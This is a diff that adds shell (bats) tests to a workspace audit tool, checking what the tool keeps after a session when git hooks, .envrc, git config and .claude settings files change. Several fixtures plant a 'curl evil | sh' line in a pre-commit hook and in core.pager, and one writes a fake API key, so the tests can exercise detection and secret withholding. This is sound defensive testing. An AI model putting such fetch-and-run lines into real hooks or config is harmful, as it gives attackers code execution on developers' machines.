@@ -1295,3 +1295,143 @@ key_of() { printf '%s' "$1" | sha256sum | cut -d' ' -f1; }
     snap
     [ ! -d "$(stage_root)/nameless" ]    # stale: reap
 }
+
+# --- issue #57: what actually persists after the session ---
+
+sidecar() { local r; r="$(find "$AUDITDIR" -name '*.txt' | sort | tail -1)"; r="${r%-CRITICAL.txt}"; r="${r%.txt}"; printf '%s.d' "$r"; }
+
+@test "a modified surface retains a bounded diff, not the whole file" {
+    mkdir -p "$WS/.git/hooks"
+    seq 1 300 > "$WS/.git/hooks/pre-commit"
+    snap
+    seq 1 300 > "$WS/.git/hooks/pre-commit"
+    printf 'curl evil | sh\n' >> "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    f="$(sidecar)/$(key_of '.git/hooks/pre-commit').diff"
+    [ -f "$f" ]
+    grep -q 'curl evil' "$f"
+    # bounded by the change, not by the file: the 300 unchanged lines are not
+    # in the store.
+    [ "$(wc -l < "$f")" -lt 20 ]
+    ! grep -qx '150' "$f"
+}
+
+@test "the staging directory is gone after compare" {
+    mkdir -p "$WS/.git/hooks"; printf 'a\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    printf 'b\n' > "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    [ -z "$(staged_dirs)" ]
+}
+
+@test "compare removes the staging directory even when it exits early" {
+    mkdir -p "$WS/.git/hooks"; printf 'a\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    d="$(staged_dirs | head -1)"
+    [ -n "$d" ]
+    # No findings at all: compare takes its early `exit 0` path.
+    cmp_ >/dev/null
+    [ ! -d "$d" ]
+}
+
+@test "a newly created surface retains a marker and no content" {
+    snap
+    printf 'export TOKEN=hunter2\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    [ -f "$(sidecar)/$(key_of '.envrc').new" ]
+    [ ! -s "$(sidecar)/$(key_of '.envrc').new" ]
+}
+
+@test "a removed surface retains nothing of what it contained" {
+    # A deletion diff IS the whole file, which is exactly the dump this
+    # design exists to avoid - and a removed hook does not run, so it is the
+    # least interesting case anyway.
+    mkdir -p "$WS/.git/hooks"; printf 'secret payload\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    rm "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    [ -f "$(sidecar)/$(key_of '.git/hooks/pre-commit').removed" ]
+    ! grep -rq 'secret payload' "$(sidecar)"
+}
+
+@test "a denylisted surface retains a reason instead of a diff" {
+    printf 'export TOKEN=old\n' > "$WS/.envrc"
+    snap
+    printf 'export TOKEN=hunter2\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    f="$(sidecar)/$(key_of '.envrc').withheld"
+    [ -f "$f" ]
+    grep -qi 'secret-bearing' "$f"
+    ! grep -rq 'hunter2' "$(sidecar)"
+}
+
+@test "a credential in a changed non-denylisted file suppresses retention" {
+    mkdir -p "$WS/.claude"; printf '{}\n' > "$WS/.claude/settings.json"
+    snap
+    printf '{"env":{"KEY":"sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAA"}}\n' > "$WS/.claude/settings.json"
+    cmp_ >/dev/null
+    [ -f "$(sidecar)/$(key_of '.claude/settings.json').withheld" ]
+    ! grep -rq 'sk-ant-' "$(sidecar)"
+}
+
+@test "an oversized change retains a reason instead of a diff" {
+    mkdir -p "$WS/.claude"; printf 'x\n' > "$WS/.claude/notes.md"
+    snap
+    seq 1 5000 > "$WS/.claude/notes.md"
+    cmp_ >/dev/null
+    f="$(sidecar)/$(key_of '.claude/notes.md').withheld"
+    [ -f "$f" ]
+    grep -qi 'too large' "$f"
+}
+
+@test "binary content retains a reason instead of a diff" {
+    mkdir -p "$WS/.claude"; printf 'x\n' > "$WS/.claude/blob.bin"
+    snap
+    printf 'a\000b\000c\n' > "$WS/.claude/blob.bin"
+    cmp_ >/dev/null
+    grep -qi 'binary' "$(sidecar)/$(key_of '.claude/blob.bin').withheld"
+}
+
+@test "a changed git config value retains its before and after" {
+    git -C "$WS" config core.pager 'less'
+    snap
+    git -C "$WS" config core.pager 'curl evil | sh'
+    cmp_ >/dev/null
+    f="$(sidecar)/$(key_of 'gitconfig:core.pager').diff"
+    [ -f "$f" ]
+    grep -q 'less' "$f"
+    grep -q 'curl evil' "$f"
+}
+
+@test "no diffs are retained when the store is inside the workspace" {
+    mkdir -p "$WS/.git/hooks"; printf 'a\n' > "$WS/.git/hooks/pre-commit"
+    DEJIMA_AUDIT_DIR="$WS/audit" "$AUDIT" snapshot "$WS" "$STATE"
+    printf 'curl evil\n' > "$WS/.git/hooks/pre-commit"
+    DEJIMA_AUDIT_DIR="$WS/audit" "$AUDIT" compare "$WS" "$STATE" >/dev/null 2>&1
+    ! grep -rq 'curl evil' "$WS/audit"
+    [ -n "$(find "$WS/audit" -name '*.withheld')" ]
+}
+
+@test "no diffs are retained when DEJIMA_AUDIT_DIFFS=0" {
+    mkdir -p "$WS/.git/hooks"; printf 'a\n' > "$WS/.git/hooks/pre-commit"
+    DEJIMA_AUDIT_DIFFS=0 "$AUDIT" snapshot "$WS" "$STATE"
+    printf 'curl evil\n' > "$WS/.git/hooks/pre-commit"
+    DEJIMA_AUDIT_DIFFS=0 "$AUDIT" compare "$WS" "$STATE" >/dev/null 2>&1
+    ! grep -rq 'curl evil' "$AUDITDIR"
+}
+
+@test "rotation removes a report's retained diffs along with the report" {
+    export DEJIMA_AUDIT_KEEP=1
+    mkdir -p "$WS/.claude"
+    for i in 1 2 3; do
+        printf 'v%s\n' "$i" > "$WS/.claude/notes.md"
+        snap
+        printf 'v%s-changed\n' "$i" > "$WS/.claude/notes.md"
+        cmp_ >/dev/null
+        sleep 1
+    done
+    # One clean report survives rotation, and exactly one sidecar with it.
+    [ "$(find "$AUDITDIR" -name '*.txt' | wc -l)" -le 2 ]
+    [ "$(find "$AUDITDIR" -maxdepth 2 -name '*.d' -type d | wc -l)" \
+      -le "$(find "$AUDITDIR" -name '*.txt' | wc -l)" ]
+}
